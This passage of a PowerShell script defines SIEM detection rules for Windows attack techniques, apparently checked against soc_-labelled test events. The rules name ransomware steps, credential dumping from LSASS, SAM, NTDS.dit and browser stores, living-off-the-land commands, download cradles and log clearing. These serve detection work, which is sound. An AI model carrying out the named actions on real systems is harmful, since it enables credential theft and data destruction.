Add-SIEMRule "RULE-02" "Disabled Account Login Storm" "T1110" "HIGH" "Authentication" "7+ failed logins on disabled accounts" "EID 4625 SubStatus=0xC000006E - logon attempt on disabled account" "Block source IP. Review if the disabled account is a former employee or service account. Correlate with other failed attempts." (Count-SOCEvents "Security" @(4625)) @("4625")

Add-SIEMRule "RULE-03" "Brute Force on Administrator" "T1110" "HIGH" "Authentication" "7+ failed logins on Administrator account" "EID 4625 targeting Administrator account with multiple failures in short window" "Implement account lockout. Enable MFA. Review source IPs for geographic anomalies." (Count-SOCEvents "Security" @(4625)) @("4625")

Add-SIEMRule "RULE-04" "User Added to Administrators/Domain Admins" "T1098.002" "CRITICAL" "Group Management" "EID 4732 or 4728 - privilege escalation via group add" "EID 4732 (local admin add) or EID 4728 (domain admin) observed for soc_ test user" "Immediately review the addition. If unauthorized, remove the user and investigate for lateral movement." ((Count-SOCEvents "Security" @(4732)) + (Count-SOCEvents "Security" @(4728))) @("4732","4728")

Add-SIEMRule "RULE-05" "Service Installed by Non-SYSTEM Account" "T1543.003" "CRITICAL" "Persistence" "EID 7045+4697 - new service created outside normal channels" "EID 7045 (System) and/or 4697 (Security) - service installation with soc_ service name" "Review the service binary path and account. Stop and remove if unauthorized. Check for persistence mechanisms." ((Count-SOCEvents "System" @(7045)) + (Count-SOCEvents "Security" @(4697))) @("7045","4697")

Add-SIEMRule "RULE-06" "Audit Policy Disabled" "T1562.002" "CRITICAL" "Defense Evasion" "EID 4719 - audit subcategory disabled (classic pre-attack evasion)" "EID 4719 observed - audit policy subcategory disabled then re-enabled" "Immediately re-enable auditing. Investigate what actions occurred during the blind window. Alert SOC." (Count-SOCEvents "Security" @(4719)) @("4719")

Add-SIEMRule "RULE-07" "Scheduled Task Created then Modified" "T1053.005" "HIGH" "Persistence" "EID 4698 + 4702 within 2 minutes - task tampering pattern" "EID 4698 (create) and EID 4702 (modify) for soc_ task in quick succession" "Review the task action and trigger. Check if the binary path points to a suspicious location." ((Count-SOCEvents "Security" @(4698)) + (Count-SOCEvents "Security" @(4702))) @("4698","4702")

Add-SIEMRule "RULE-08" "DCSync - AD Replication Access" "T1003.006" "CRITICAL" "Credential Access" "EID 4662 - AD replication access by non-DC account" "EID 4662 - directory replication GetChangesAll privilege access (DCSync pattern)" "Isolate the machine. DCSync allows dumping all domain password hashes. Treat as full domain compromise." (Count-SOCEvents "Security" @(4662)) @("4662")

Add-SIEMRule "RULE-09" "Account Lockout Storm" "T1110" "HIGH" "Authentication" "EID 4740 - repeated lockout/unlock cycles indicating password spray" "EID 4740 observed multiple times for soc_ test user" "Identify source systems generating the bad passwords. May indicate credential spray attack." (Count-SOCEvents "Security" @(4740)) @("4740")

Add-SIEMRule "RULE-10" "Pass-The-Hash Indicator" "T1550.002" "CRITICAL" "Lateral Movement" "EID 4648 + 4624 Type3 - explicit credentials with network logon" "EID 4648 (explicit creds) followed by EID 4624 Type3 for soc_ user" "Block the source. Reset credentials for affected accounts. Scan for malware using Mimikatz or similar." ((Count-SOCEvents "Security" @(4648)) + (Count-SOCEvents "Security" @(4624))) @("4648","4624")

Add-SIEMRule "RULE-13" "LSASS Memory Access - Credential Dump" "T1003.001" "CRITICAL" "Credential Access" "EID 4656 - handle to LSASS process requested (Mimikatz indicator)" "EID 4656 - handle requested on LSASS object with read access mask 0x1010" "Isolate immediately. LSASS access indicates credential dumping. Reset all domain passwords." (Count-SOCEvents "Security" @(4656)) @("4656")

Add-SIEMRule "RULE-14" "SAM Database Access" "T1003.002" "CRITICAL" "Credential Access" "EID 4663 - access to SAM hive (local cred dump)" "EID 4663 - file access to SAM or sensitive system path" "SAM access allows dumping local account hashes. Isolate machine, reset local accounts." (Count-SOCEvents "Security" @(4663)) @("4663")

Add-SIEMRule "RULE-15" "Shadow Copy Deletion Command" "T1490" "HIGH" "Impact" "EID 4688 - vssadmin.exe spawned with delete shadows" "EID 4688 - vssadmin.exe process with 'delete shadows /all /quiet' arguments" "Ransomware pre-encryption phase. Immediately isolate the machine. Check for mass file modification." (Count-SOCEvents "Security" @(4688) "vssadmin") @("4688+vssadmin")

Add-SIEMRule "RULE-16" "Mass File Modification (Ransomware)" "T1486" "CRITICAL" "Impact" "EID 4663 - 30+ file rename/modify events in short window" "EID 4663 - mass file operations with .enc/.locked extension renames for soc_ ransom files" "Immediate isolation. Identify patient zero. Check backup integrity before any recovery attempt." (Count-SOCEvents "Security" @(4663)) @("4663")

Add-SIEMRule "RULE-18" "Registry Run Key Persistence" "T1547.001" "HIGH" "Persistence" "EID 4657 - Run key modified (Sysmon 13 if available)" "EID 4657 - Run key write for soc_ persistence test" "Review the registry value and the binary it points to. Remove if unauthorized. Check for additional persistence." (Count-SOCEvents "Security" @(4657)) @("4657")

Add-SIEMRule "RULE-22" "PsExec-Style Lateral Movement" "T1021.002" "CRITICAL" "Lateral Movement" "EID 7045 - service named PSEXESVC pattern installed" "EID 7045 - service creation matching PSEXESVC or soc_ lateral service pattern" "PsExec used for remote command execution. Identify what commands were run. Review source and destination." (Count-SOCEvents "System" @(7045)) @("7045")

Add-SIEMRule "RULE-25" "PowerShell Suspicious Script Block" "T1059.001" "HIGH" "Execution" "EID 4104 - script block with IEX/WebClient/Mimikatz keywords" "EID 4104 - PowerShell ScriptBlock logging captured suspicious IEX download cradle for soc_ test" "Block the PowerShell process. Review the full script block content. Check for downloaded payloads." (Count-SOCEvents "PowerShell" @(4104)) @("4104")

Add-SIEMRule "RULE-30" "Backup/VSS Service Stopped" "T1489" "HIGH" "Impact" "EID 7036 - VSS/backup service stopped (ransomware preparation)" "EID 7036 - VSS or Spooler service stop/start observed during soc_ test" "Ransomware commonly stops backup services. Verify backup integrity. Check for accompanying mass file changes." (Count-SOCEvents "System" @(7036)) @("7036")

Add-SIEMRule "RULE-37" "PowerShell ExecutionPolicy Bypass" "T1059.001" "HIGH" "Execution" "EID 4688 - powershell.exe with -ExecutionPolicy Bypass flag" "EID 4688 - powershell.exe with Bypass flag for soc_ test" "Review what was executed with the bypass. Check for malicious scripts downloaded or run." (Count-SOCEvents "Security" @(4688) "powershell") @("4688+powershell")

Add-SIEMRule "RULE-39" "WMI Remote Process Creation" "T1047" "HIGH" "Execution" "EID 4688 - process created by WMI (wmiprvse parent)" "EID 4688 - WMI-created process for soc_ WMI abuse test" "WMI used for remote or local stealthy execution. Review the spawned command. Common for lateral movement." (Count-SOCEvents "Security" @(4688) "WmiPrvSE") @("4688+WmiPrvSE")

Add-SIEMRule "RULE-40" "WMI Event Subscription (Persistence)" "T1546.003" "CRITICAL" "Persistence" "Sysmon EID 19/20/21 - WMI filter/consumer/binding created" "Sysmon EIDs 19/20/21 for soc_ WMI subscription (SOC_Filter/Consumer/Binding)" "WMI subscriptions survive reboots. Enumerate and remove all root\subscription objects immediately." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -in @(19,20,21) -and (Is-SOCEvent $_ "Sysmon")}).Count } else { 0 }) @("Sysmon:19","Sysmon:20","Sysmon:21") $(if (-not $sysmonOK) {"Sysmon not installed"} else {""})

Add-SIEMRule "RULE-41" "RDP Password Spray (EID 4625 Type=10)" "T1110.003" "HIGH" "Lateral Movement" "EID 4625 LogonType=10 - RDP failed logon spray" "EID 4625 LogonType=10 for soc_ RDP test user via LogonUser API" "Block source IP. Enable Network Level Authentication (NLA). Consider geo-blocking RDP." (Count-SOCEvents "Security" @(4625)) @("4625")

Add-SIEMRule "RULE-42" "Off-Hours RDP Session (EID 4624 Type=10)" "T1021.001" "HIGH" "Lateral Movement" "EID 4624 LogonType=10 outside 08:00-18:00 business hours" "EID 4624 LogonType=10 for soc_ user via LogonUser API with Provider=3 (WINNT50)" "Verify with user if they initiated the session. Off-hours RDP may indicate compromised credentials." (Count-SOCEvents "Security" @(4624)) @("4624")

Add-SIEMRule "RULE-48" "Audit Log Cleared (CRITICAL)" "T1070.001" "CRITICAL" "Defense Evasion" "EID 1102 (Security cleared) or EID 104 (System cleared)" "EID 1102 or 104 - Security/System log cleared during test" "This is a critical indicator of compromise. Immediately investigate. Review other log sources (Sysmon, FW)." ((Count-SOCEvents "Security" @(1102)) + (Count-SOCEvents "System" @(104))) @("1102","104")

# Sysmon rules
$sysSkip = if (-not $sysmonOK) {"Sysmon not installed"} else {""}
Add-SIEMRule "RULE-51" "Ransom Note File Created" "T1486" "CRITICAL" "Impact" "Sysmon EID 11 - README_DECRYPT/HOW_TO_DECRYPT file created" "Sysmon EID 11 - ransom note file creation (README_DECRYPT_$RND.txt) in SACL folder" "Ransomware infection confirmed. Isolate immediately. Identify patient zero. Notify IR team." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 11 -and ((Get-SysmonField2 $_ "TargetFilename") -match "README|DECRYPT|HOW_TO|RANSOM|soc_") }).Count } else {0}) @("Sysmon:11") $sysSkip

Add-SIEMRule "RULE-52" "Bulk File Extension Rename (.locked/.enc)" "T1486" "CRITICAL" "Impact" "Sysmon EID 11 - mass file creation with encrypted extension" "Sysmon EID 11 - mass .enc/.locked file creation from SACL-audited folder for soc_ test" "Active ransomware encryption. Immediate network isolation required. Do not reboot." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 11 -and ((Get-SysmonField2 $_ "TargetFilename") -match "\.enc$|\.locked$|soc_") }).Count } else {0}) @("Sysmon:11") $sysSkip

Add-SIEMRule "RULE-86" "Sysmon: LSASS Process Access (0x1010 Mask)" "T1003.001" "CRITICAL" "Credential Access" "Sysmon EID 10 - lsass.exe handle opened with Mimikatz access mask" "Sysmon EID 10 - OpenProcess(0x1010) on lsass.exe detected (Mimikatz pattern)" "Credential dumping in progress. Isolate host. Reset all domain credentials. Forensically image memory." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 10 -and ((Get-SysmonField2 $_ "TargetImage") -match "lsass")}).Count } else {0}) @("Sysmon:10") $sysSkip

Add-SIEMRule "RULE-93" "AV/Defender Exclusion Path Added" "T1562.001" "CRITICAL" "Defense Evasion" "Sysmon EID 13 - Defender Exclusions registry key written" "Sysmon EID 13 - registry write to Windows Defender Exclusions key for soc_ test" "Attacker adding AV exclusions to hide malware. Review and remove exclusions. Check for malware in excluded paths." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 13 -and ((Get-SysmonField2 $_ "TargetObject") -match "Exclusions|soc_")}).Count } else {0}) @("Sysmon:13") $sysSkip
# ─ RULES 11-12: Kerberos
Add-SIEMRule "RULE-11" "AS-REP Roasting" "T1558.004" "HIGH" "Kerberos" "EID 4768 - TGT with PreAuth=0 (DoesNotRequirePreAuth flag set)" "EID 4768 - soc_asrep_ user DoesNotRequirePreAuth + LDAP bind" "Disable DoesNotRequirePreAuth on all accounts. Audit via Get-ADUser with filter on UAC flag." (Count-SOCEvents "Security" @(4768)) @("4768") $(if (-not $adOK) {"AD not available"} else {""})
Add-SIEMRule "RULE-12" "Kerberoasting - Multiple TGS Requests" "T1558.003" "HIGH" "Kerberos" "EID 4769 - 4+ TGS requests in short window" "EID 4769 - multiple SYSVOL/NETLOGON UNC access generating TGS burst" "Use AES encryption on service accounts. Alert on >5 EID 4769 from same source in 60s." (Count-SOCEvents "Security" @(4769)) @("4769")
# ─ RULE-17: WMI Persistence
Add-SIEMRule "RULE-17" "WMI Event Subscription Persistence" "T1546.003" "CRITICAL" "Persistence" "Sysmon EID 19/20 or EID 4688 - WMI filter/consumer created" "Sysmon EID 19/20 - SOC_R17F/R17C filter+consumer RULE-17" "Enumerate root/subscription namespace. Remove all unauthorized WMI subscription objects." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -in @(19,20) -and (Is-SOCEvent $_ "Sysmon")}).Count } else { Count-SOCEvents "Security" @(4688) }) @("Sysmon:19","Sysmon:20") $sysSkip
# ─ RULES 19-21
Add-SIEMRule "RULE-19" "Encoded PowerShell Command Execution" "T1059.001" "HIGH" "Execution" "EID 4688 - powershell.exe with -EncodedCommand flag" "EID 4688 - PS EncodedCommand RULE-19 test" "Audit all -EncodedCommand usage. Decode and review payload content. Block if unnecessary via AMSI." (Count-SOCEvents "Security" @(4688) "powershell") @("4688+powershell")
Add-SIEMRule "RULE-20" "PowerShell Download Cradle (IEX/WebClient)" "T1059.001" "CRITICAL" "Execution" "EID 4688/4104 - IEX + New-Object Net.WebClient pattern" "EID 4688/4104 - IEX download cradle soc_test_ in PS RULE-20" "Block WebClient in AppLocker. Review downloaded content. Isolate host if payload found." (Count-SOCEvents "Security" @(4688) "powershell") @("4688","4104")
Add-SIEMRule "RULE-21" "New Local Admin Account Created" "T1136.001" "CRITICAL" "Account Lifecycle" "EID 4720 + EID 4732 - account created and immediately added to Administrators" "EID 4720 (create) and EID 4732 (admin add) for soc_r21_ user" "Remove from Admins immediately. Investigate authorization. Check for persistence mechanisms." ((Count-SOCEvents "Security" @(4720)) + (Count-SOCEvents "Security" @(4732))) @("4720","4732")
# ─ RULES 23-29
Add-SIEMRule "RULE-23" "Domain User Enumeration via Net Command" "T1087.002" "MEDIUM" "Discovery" "EID 4688 - net.exe user /domain enumeration" "EID 4688 - net.exe user /domain RULE-23" "Domain enumeration precedes targeted attacks. Correlate with concurrent auth attempts." (Count-SOCEvents "Security" @(4688) "net") @("4688+net.exe")
Add-SIEMRule "RULE-24" "Domain Trust Enumeration (nltest)" "T1482" "HIGH" "Discovery" "EID 4688 - nltest.exe /domain_trusts" "EID 4688 - nltest /domain_trusts RULE-24" "Domain trust recon precedes cross-domain lateral movement. Verify if authorized." (Count-SOCEvents "Security" @(4688) "nltest") @("4688+nltest")
Add-SIEMRule "RULE-26" "AD LDAP Enumeration via PowerShell" "T1087.002" "HIGH" "Discovery" "EID 4688 - PS Get-ADUser/ADGroup/ADComputer bulk query" "EID 4688 - PS AD enum RULE-26 via encoded Get-ADUser/Group/Computer" "Monitor LDAP query volume. Unusual bulk AD queries indicate recon phase." (Count-SOCEvents "Security" @(4688) "powershell") @("4688+AD-LDAP") $(if (-not $adOK) {"AD not available"} else {""})
Add-SIEMRule "RULE-27" "Token/Privilege Enumeration via PS" "T1134" "MEDIUM" "Privilege Escalation" "EID 4688 - PS WindowsIdentity token check" "EID 4688 - PS token enumeration RULE-27" "Token enumeration may precede impersonation. Monitor for subsequent privilege escalation." (Count-SOCEvents "Security" @(4688) "powershell") @("4688+token-check")
Add-SIEMRule "RULE-28" "System Time Changed (Log Evasion)" "T1070.006" "HIGH" "Defense Evasion" "EID 4616 - system time modified" "EID 4616 - Set-Date +1min time manipulation RULE-28" "Time change may indicate timestomping or log evasion. Verify NTP sync. Check log timestamps." (Count-SOCEvents "Security" @(4616)) @("4616")
Add-SIEMRule "RULE-29" "New WMI Subscription (Persistence)" "T1546.003" "CRITICAL" "Persistence" "Sysmon EID 19/20 or EID 4688 - WMI subscription objects created" "Sysmon EID 19/20 - SOC_R29F/R29C filter+consumer RULE-29" "Enumerate root/subscription. Remove all unauthorized filter/consumer/binding objects." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -in @(19,20) -and (Is-SOCEvent $_ "Sysmon")}).Count } else { Count-SOCEvents "Security" @(4688) }) @("Sysmon:19","Sysmon:20") $sysSkip
# ─ RULES 31-36
Add-SIEMRule "RULE-31" "Multiple Failed Admin Logons" "T1110" "HIGH" "Authentication" "EID 4625 - 3+ failed logons on Administrator account" "EID 4625 - 3x LogonUser API failed on Administrator RULE-31" "Implement lockout for Administrator. Enable MFA on privileged accounts." (Count-SOCEvents "Security" @(4625)) @("4625")
Add-SIEMRule "RULE-32" "Boot Configuration Tamper (bcdedit)" "T1490" "HIGH" "Impact" "EID 4688 - bcdedit.exe spawned" "EID 4688 - bcdedit.exe /enum execution RULE-32" "Ransomware pre-encryption step. Correlate with shadow deletion and mass file modification." (Count-SOCEvents "Security" @(4688) "bcdedit") @("4688+bcdedit")
Add-SIEMRule "RULE-33" "Security-Adjacent Service Stop/Start" "T1489" "HIGH" "Impact" "System EID 7036 - Spooler or AV service stopped/restarted" "System EID 7036 - Spooler stop+start RULE-33" "Service disruption may indicate ransomware prep or lateral movement. Verify if authorized." (Count-SOCEvents "System" @(7036)) @("7036+Spooler")
Add-SIEMRule "RULE-34" "Firewall Rule Added (Defense Evasion)" "T1562.004" "HIGH" "Defense Evasion" "EID 4946 - Windows Firewall rule added/modified" "EID 4946 - netsh advfirewall add rule SOC_FW_ port 55555 RULE-34" "Unauthorized FW changes may open backdoor ports. Remove rule and investigate source." (Count-SOCEvents "Security" @(4946)) @("4946")
Add-SIEMRule "RULE-35" "Local Password/Lockout Policy Changed" "T1484" "HIGH" "Policy Changes" "EID 4739 - domain/local password policy modified" "EID 4739 - lockout threshold change RULE-35" "Policy change affects account security. Verify if authorized. Watch for threshold set to 0." (Count-SOCEvents "Security" @(4739)) @("4739")
Add-SIEMRule "RULE-36" "Logon from Unusual Workstation" "T1078" "MEDIUM" "Authentication" "EID 4625 - logon attempt from loopback/unusual source" "EID 4625 - net use via 127.0.0.1 unusual source RULE-36" "Unusual source IPs for admin accounts indicate lateral movement or credential misuse." (Count-SOCEvents "Security" @(4625)) @("4625")
# ─ RULE-38
Add-SIEMRule "RULE-38" "Object Access to SAM/NTDS Sensitive Path" "T1003.002" "CRITICAL" "Credential Access" "EID 4663 - file access to SAM/NTDS credential path" "EID 4663 - SAM/config file access RULE-38" "SAM/NTDS access = credential theft. Isolate host immediately. Reset all passwords." (Count-SOCEvents "Security" @(4663)) @("4663")
# ─ RULES 43-47
Add-SIEMRule "RULE-43" "Logon from Rare Source Address" "T1078" "HIGH" "Authentication" "EID 4625 - logon from rare/new source IP" "EID 4625 - rare source logon RULE-43" "Build baseline of normal source IPs per account. Alert on first-seen sources." (Count-SOCEvents "Security" @(4625)) @("4625")
Add-SIEMRule "RULE-44" "Admin Account Logon Non-Admin Context" "T1078.002" "HIGH" "Authentication" "EID 4625 - Administrator logon in unusual context" "EID 4625 - LogonUser Type3 failed on Administrator RULE-44" "Admin accounts should only authenticate from admin hosts. Investigate any deviation." (Count-SOCEvents "Security" @(4625)) @("4625")
Add-SIEMRule "RULE-45" "Group Policy Object Created/Modified" "T1484.001" "CRITICAL" "Defense Evasion" "EID 5136 - GPO created or modified (domain-wide policy impact)" "EID 5136 - New-GPO SOC_GPO_ creation RULE-45" "GPO modification can affect all domain machines. Verify authorization. Audit startup scripts." (Count-SOCEvents "Security" @(5136)) @("5136") $(if (-not $adOK) {"AD not available"} else {""})
Add-SIEMRule "RULE-46" "Scheduled Task with Binary in Temp Path" "T1053.005" "HIGH" "Persistence" "EID 4698 - scheduled task action in TEMP/non-standard path" "EID 4698 - task soc_r46_ pointing to TEMP binary RULE-46" "Binary in TEMP for task action is malware indicator. Remove task and quarantine binary." (Count-SOCEvents "Security" @(4698)) @("4698")
Add-SIEMRule "RULE-47" "User Account Renamed (Identity Masquerade)" "T1098" "HIGH" "Account Lifecycle" "EID 4738 - user account renamed/modified" "EID 4738 - account modify soc_r47_ rename RULE-47" "Account rename may hide attacker reusing existing account to avoid detection." (Count-SOCEvents "Security" @(4738)) @("4738")
# ─ RULE-49/50
Add-SIEMRule "RULE-49" "Anonymous Logon Attempt (IPC$)" "T1078.001" "HIGH" "Authentication" "EID 4625 - anonymous/null session logon attempt to IPC$" "EID 4625 - net use IPC$ empty credentials RULE-49" "Block null session access via Group Policy. Anonymous IPC$ is an old attack vector." (Count-SOCEvents "Security" @(4625)) @("4625")
Add-SIEMRule "RULE-50" "Credential Dump Chain (LSASS + SAM)" "T1003" "CRITICAL" "Credential Access" "EID 4656 (LSASS handle) + EID 4663 (SAM access) in same session" "EID 4656 LSASS handle + EID 4663 SAM access dual-signal RULE-50" "Full credential dump in progress. Isolate immediately. Reset ALL domain passwords." ((Count-SOCEvents "Security" @(4656)) + (Count-SOCEvents "Security" @(4663))) @("4656","4663")
# ─ RULES 53-70
Add-SIEMRule "RULE-53" "Diskpart Destructive Command" "T1561.002" "HIGH" "Impact" "EID 4688 - diskpart.exe invoked" "EID 4688 - diskpart /s invocation RULE-53" "diskpart can wipe volumes. Any non-admin diskpart invocation is highly suspicious." (Count-SOCEvents "Security" @(4688) "diskpart") @("4688+diskpart")
Add-SIEMRule "RULE-54" "Backup Catalog Deletion (wbadmin)" "T1490" "HIGH" "Impact" "EID 4688 - wbadmin delete catalog" "EID 4688 - wbadmin delete catalog RULE-54" "Ransomware pre-encryption step. Correlate with vssadmin shadow deletion." (Count-SOCEvents "Security" @(4688) "wbadmin") @("4688+wbadmin")
Add-SIEMRule "RULE-55" "Boot Recovery Disabled + Shadow Delete" "T1490" "CRITICAL" "Impact" "EID 4688 - bcdedit recoveryenabled No + vssadmin delete shadows /all" "EID 4688 - bcdedit+vssadmin delete chain RULE-55" "Full ransomware kill chain confirmed. Immediate isolation required." (Count-SOCEvents "Security" @(4688) "bcdedit") @("4688+bcdedit+vssadmin")
Add-SIEMRule "RULE-56" "NTDS.dit/SAM Credential Store Access" "T1003.003" "CRITICAL" "Credential Access" "EID 4663 - access to NTDS.dit or system credential hive" "EID 4663 - NTDS.dit/SAM access RULE-56" "NTDS.dit = all domain hashes. Access = full domain compromise. Isolate DC immediately." (Count-SOCEvents "Security" @(4663)) @("4663")
Add-SIEMRule "RULE-57" "Browser Credential Store Access" "T1555.003" "HIGH" "Credential Access" "EID 4663 - Chrome Login Data SQLite accessed" "EID 4663 - Chrome Login Data access RULE-57" "Browser credential theft. Reset all stored passwords. Check for exfiltration activity." (Count-SOCEvents "Security" @(4663)) @("4663")
Add-SIEMRule "RULE-58" "Credential Manager Enumeration (vaultcmd)" "T1555.004" "HIGH" "Credential Access" "EID 4688 - vaultcmd.exe /list" "EID 4688 - vaultcmd /list RULE-58" "Credential Manager stores plaintext credentials. Audit what is stored. Remove unneeded entries." (Count-SOCEvents "Security" @(4688) "vaultcmd") @("4688+vaultcmd")
Add-SIEMRule "RULE-59" "Registry Hive Export (SAM+SYSTEM)" "T1003.002" "CRITICAL" "Credential Access" "EID 4688 - reg.exe save HKLM\SAM and HKLM\SYSTEM" "EID 4688 - reg save SAM+SYSTEM RULE-59" "SAM+SYSTEM export allows offline credential cracking. Treat as active credential theft." (Count-SOCEvents "Security" @(4688) "reg") @("4688+reg-save-SAM")
Add-SIEMRule "RULE-60" "SSH Private Key File Discovered" "T1552.004" "HIGH" "Credential Access" "Sysmon EID 11 - id_rsa file access/creation detected" "Sysmon EID 11 - id_rsa file found in user home directory RULE-60" "SSH private key exposure allows unauthorized remote access. Rotate affected keys immediately." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 11 -and ((Get-SysmonField2 $_ "TargetFilename") -match "id_rsa|\.pem|id_ecdsa")}).Count } else {0}) @("Sysmon:11+id_rsa") $sysSkip
Add-SIEMRule "RULE-61" "WMIC Process Create (Lateral Movement)" "T1021.006" "HIGH" "Lateral Movement" "EID 4688 - wmic.exe process call create" "EID 4688 - wmic process call create RULE-61" "WMIC remote execution is a common lateral movement technique. Verify if authorized." (Count-SOCEvents "Security" @(4688) "wmic") @("4688+wmic-process")
Add-SIEMRule "RULE-62" "Service Creation via SC (Remote Pattern)" "T1569.002" "HIGH" "Lateral Movement" "System EID 7045 - sc.exe service creation (PsExec-style)" "System EID 7045 - sc create on localhost RULE-62" "SC-based service = PsExec/Metasploit pattern. Review binary path and source account." (Count-SOCEvents "System" @(7045)) @("7045")
Add-SIEMRule "RULE-63" "Legacy AT Scheduler Abuse" "T1053.002" "MEDIUM" "Persistence" "EID 4688 - at.exe usage" "EID 4688 - at.exe invocation RULE-63" "at.exe deprecated but still functional. Any usage in modern environments is suspicious." (Count-SOCEvents "Security" @(4688) "at") @("4688+at.exe")
Add-SIEMRule "RULE-64" "Admin Share Access Attempt (C$)" "T1021.002" "HIGH" "Lateral Movement" "EID 5140 - net use to administrative C$ share" "EID 5140 - net use C$ access RULE-64" "C$ access restricted to Admins. Unauthorized access = lateral movement indicator." (Count-SOCEvents "Security" @(5140)) @("5140")
Add-SIEMRule "RULE-65" "MMC/DCOM Admin Tool Spawn" "T1021.003" "MEDIUM" "Lateral Movement" "EID 4688 - mmc.exe spawned (DCOM admin tool)" "EID 4688 - mmc.exe /32 RULE-65" "MMC via DCOM used for lateral movement. Correlate with network logon events from same source." (Count-SOCEvents "Security" @(4688) "mmc") @("4688+mmc.exe")
Add-SIEMRule "RULE-66" "Certutil Decode (LOLBin Deobfuscation)" "T1140" "HIGH" "Execution" "EID 4688 - certutil.exe -decode argument" "EID 4688 - certutil -decode RULE-66" "certutil decode stages payloads. Review the decoded content and source file immediately." (Count-SOCEvents "Security" @(4688) "certutil") @("4688+certutil-decode")
Add-SIEMRule "RULE-67" "Regsvr32 Squiblydoo Pattern" "T1218.010" "CRITICAL" "Execution" "EID 4688 - regsvr32.exe /i URL scrobj.dll pattern" "EID 4688 - regsvr32 /s /n /u /i:https scrobj.dll RULE-67" "Squiblydoo bypasses AppLocker/SRP. Isolate and review what SCT script was loaded." (Count-SOCEvents "Security" @(4688) "regsvr32") @("4688+regsvr32-scrobj")
Add-SIEMRule "RULE-68" "MSHTA Executing Script" "T1218.005" "HIGH" "Execution" "EID 4688 - mshta.exe with javascript: URI" "EID 4688 - mshta.exe javascript: RULE-68" "MSHTA is a common bypass technique. Block mshta.exe via AppLocker policy." (Count-SOCEvents "Security" @(4688) "mshta") @("4688+mshta")
Add-SIEMRule "RULE-69" "Rundll32 with Javascript Argument" "T1218.011" "HIGH" "Execution" "EID 4688 - rundll32.exe with javascript: argument" "EID 4688 - rundll32 javascript: RULE-69" "Rundll32+javascript is a scriptlet bypass. Block via AppLocker and WDAC rules." (Count-SOCEvents "Security" @(4688) "rundll32") @("4688+rundll32-js")
Add-SIEMRule "RULE-70" "Application Log Cleared (wevtutil)" "T1070.001" "HIGH" "Defense Evasion" "System EID 104 - Application event log cleared" "System EID 104 - wevtutil cl Application RULE-70" "Log clearing destroys forensic evidence. Correlate with other defense evasion indicators." (Count-SOCEvents "System" @(104)) @("104+Application-clear")
# ─ RULES 71-80
Add-SIEMRule "RULE-71" "File Timestomp (CreationTime Backdated)" "T1070.006" "HIGH" "Defense Evasion" "Sysmon EID 2 - file creation time changed (backdated by 5 years)" "Sysmon EID 2 - SetCreationTime via PS soc_r71_ RULE-71" "Timestomping hides malware age. Check files with creation time before system deployment date." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 2 -and (Is-SOCEvent $_ "Sysmon")}).Count } else {0}) @("Sysmon:2") $sysSkip
Add-SIEMRule "RULE-72" "Svchost from Non-System Path" "T1036.005" "CRITICAL" "Defense Evasion" "EID 4688 - svchost.exe running from TEMP (masquerading)" "EID 4688 - svchost.exe copied to TEMP and executed RULE-72" "Any svchost.exe outside System32 is malware. Isolate and quarantine immediately." (Count-SOCEvents "Security" @(4688) "svchost") @("4688+svchost-TEMP")
Add-SIEMRule "RULE-73" "COM Hijack Registry Key (HKCU CLSID)" "T1546.015" "CRITICAL" "Persistence" "EID 4657 - HKCU\\Classes\\CLSID InprocServer32 written (SACL-audited)" "EID 4657 - COM hijack CLSID InprocServer32 key with SACL RULE-73" "COM hijacking survives reboots in user context. Enumerate HKCU\\Software\\Classes\\CLSID." (Count-SOCEvents "Security" @(4657)) @("4657+CLSID")
Add-SIEMRule "RULE-74" "Startup Folder Persistence (.bat)" "T1547.001" "CRITICAL" "Persistence" "Sysmon EID 11 - .bat file created in Startup folder via cmd.exe" "Sysmon EID 11 - soc_r74_.bat dropped to Startup RULE-74" "Startup folder persistence survives reboots. Enumerate and audit all Startup folder contents." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 11 -and ((Get-SysmonField2 $_ "TargetFilename") -match "Startup|soc_r74")}).Count } else {0}) @("Sysmon:11+Startup") $sysSkip
Add-SIEMRule "RULE-75" "Netsh Portproxy Added (Port Forwarding)" "T1090.001" "HIGH" "Command and Control" "EID 4688 - netsh.exe portproxy add v4tov4" "EID 4688 - netsh portproxy add 4444->80 RULE-75" "Port proxying tunnels C2. Check: netsh interface portproxy show all for active rules." (Count-SOCEvents "Security" @(4688) "netsh") @("4688+netsh-portproxy")
Add-SIEMRule "RULE-76" "BITS Transfer Job Created" "T1197" "HIGH" "Execution" "EID 4688 - bitsadmin.exe /transfer job" "EID 4688 - bitsadmin /transfer download job RULE-76" "BITS jobs persist across reboots. Review: bitsadmin /list /allusers /verbose." (Count-SOCEvents "Security" @(4688) "bitsadmin") @("4688+bitsadmin")
Add-SIEMRule "RULE-77" "DNS over HTTPS Resolver Lookup" "T1071.004" "MEDIUM" "Command and Control" "Sysmon EID 22 - DoH resolver domain queried" "Sysmon EID 22 - nslookup cloudflare-dns.com DoH pattern RULE-77" "DoH bypasses DNS monitoring. Correlate with subsequent unusual connections." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 22 -and ((Get-SysmonField2 $_ "QueryName") -match "cloudflare-dns|dns.google|doh")}).Count } else { Count-SOCEvents "Security" @(4688) "nslookup" }) @("Sysmon:22","4688+nslookup") $sysSkip
Add-SIEMRule "RULE-78" "Network Connection Enumeration (netstat+arp)" "T1049" "MEDIUM" "Discovery" "EID 4688 - netstat.exe -ano + arp.exe -a discovery pair" "EID 4688 - netstat+arp execution pair RULE-78" "Network discovery precedes lateral movement. Correlate with concurrent auth attempts." (Count-SOCEvents "Security" @(4688) "netstat") @("4688+netstat+arp")
Add-SIEMRule "RULE-79" "Sensitive Credential File Discovery" "T1083" "HIGH" "Discovery" "EID 4688 - dir /s /b for .kdbx .pfx .key .p12 files" "EID 4688 - cmd dir search for credential containers RULE-79" "Searching for credential files = pre-exfiltration recon. Block sensitive file access." (Count-SOCEvents "Security" @(4688) "cmd") @("4688+dir-sensitive")
